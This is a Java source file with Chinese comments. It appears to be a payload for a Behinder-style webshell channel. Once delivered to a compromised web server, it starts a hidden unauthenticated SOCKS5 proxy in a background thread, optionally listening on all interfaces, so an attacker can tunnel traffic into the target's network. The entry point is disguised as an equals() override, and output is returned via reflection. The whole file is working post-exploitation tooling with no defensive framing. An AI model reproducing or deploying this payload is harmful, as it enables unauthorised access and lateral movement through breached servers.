// 目标侧 SOCKS5 服务载荷（behinder-java 通道发送，一次性启动后台线程）：
// 无鉴权 + CONNECT 语义（纯 JDK，双线程中继）；监听端口 p，绑定面 a（空/loopback=仅本机，
// *=任意来源）。启动后本请求即回 OK——后续流量不再经 web 通道（直连目标端口）。
// 约束：默认包、全反射回显、单 class、零跨类引用、占位值唯一。
public class WsmSocks {

	public static final String p = "WSMSK-P0"; // 监听端口
	public static final String a = "WSMSK-A0"; // 绑定面：空=loopback，*=0.0.0.0

	public boolean equals(Object ctx) {
		String out;
		try {
			int port = Integer.parseInt(String.valueOf(p)); // valueOf 屏障防常量折叠
			boolean any = "*".equals(a);
			final java.net.ServerSocket ss = new java.net.ServerSocket(port, 16,
				any ? null : java.net.InetAddress.getLoopbackAddress());
			Thread t = new Thread(() -> {
				while (true) {
					try {
						java.net.Socket c = ss.accept();
						new Thread(() -> serve(c)).start();
					} catch (Throwable ignored) { return; }
				}
			});
			t.setDaemon(true);
			t.start();
			out = "OK socks5 listening " + (any ? "0.0.0.0" : "127.0.0.1") + ":" + port + " (no-auth CONNECT)";
		} catch (Throwable e) { out = "!ERR " + e; }
		try { write(respOf(ctx), out); } catch (Throwable ignored) {}
		return true;
	}

	static void serve(java.net.Socket c) {
		try {
			java.io.InputStream in = c.getInputStream();
			java.io.OutputStream out = c.getOutputStream();
			// 握手：VER NMETHODS METHODS → 05 00（无鉴权）
			int ver = in.read();
			int n = in.read();
			for (int i = 0; i < n; i++) in.read();
			if (ver != 5) { c.close(); return; }
			out.write(5); out.write(0); out.flush();
			// 请求：VER CMD RSV ATYP ADDR PORT（只支持 CONNECT=01）
			if (in.read() != 5 || in.read() != 1 || in.read() != 0) { c.close(); return; }
			int atyp = in.read();
			String host;
			if (atyp == 1) {
				byte[] b = new byte[4]; readFully(in, b);
				host = (b[0] & 0xFF) + "." + (b[1] & 0xFF) + "." + (b[2] & 0xFF) + "." + (b[3] & 0xFF);
			} else if (atyp == 3) {
				int len = in.read();
				byte[] b = new byte[len]; readFully(in, b);
				host = new String(b, "UTF-8");
			} else if (atyp == 4) {
				byte[] b = new byte[16]; readFully(in, b);
				StringBuilder sb = new StringBuilder();
				for (int i = 0; i < 16; i += 2) {
					if (i > 0) sb.append(":");
					sb.append(String.format("%02x%02x", b[i], b[i + 1]));
				}
				host = sb.toString();
			} else { c.close(); return; }
			int port = ((in.read() & 0xFF) << 8) | (in.read() & 0xFF);
			java.net.Socket dst;
			try { dst = new java.net.Socket(); dst.connect(new java.net.InetSocketAddress(host, port), 8000); }
			catch (Throwable e) {
				out.write(5); out.write(3); out.write(0); out.write(1);
				out.write(new byte[4]); out.write(0); out.write(0); out.flush();
				c.close(); return;
			}
			// 成功应答：05 00 00 01 0.0.0.0 0
			out.write(5); out.write(0); out.write(0); out.write(1);
			out.write(new byte[4]); out.write(0); out.write(0); out.flush();
			relay(c, dst);
		} catch (Throwable ignored) {}
	}

	static void relay(java.net.Socket a, java.net.Socket b) {
		Thread t1 = pump(a, b);
		Thread t2 = pump(b, a);
		try { t1.join(); } catch (Throwable ignored) {}
		try { t2.join(); } catch (Throwable ignored) {}
		try { a.close(); } catch (Throwable ignored) {}
		try { b.close(); } catch (Throwable ignored) {}
	}

	static Thread pump(java.net.Socket from, java.net.Socket to) {
		Thread t = new Thread(() -> {
			try {
				java.io.InputStream in = from.getInputStream();
				java.io.OutputStream out = to.getOutputStream();
				byte[] buf = new byte[16384];
				int n;
				while ((n = in.read(buf)) != -1) { out.write(buf, 0, n); out.flush(); }
			} catch (Throwable ignored) {}
			try { to.close(); } catch (Throwable ignored) {}
		});
		t.setDaemon(true);
		t.start();
		return t;
	}

	static void readFully(java.io.InputStream in, byte[] b) throws Exception {
		int got = 0;
		while (got < b.length) { int r = in.read(b, got, b.length - got); if (r == -1) throw new java.io.EOFException(); got += r; }
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) { Object[] a = (Object[]) ctx; return a.length > 1 ? a[1] : null; }
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
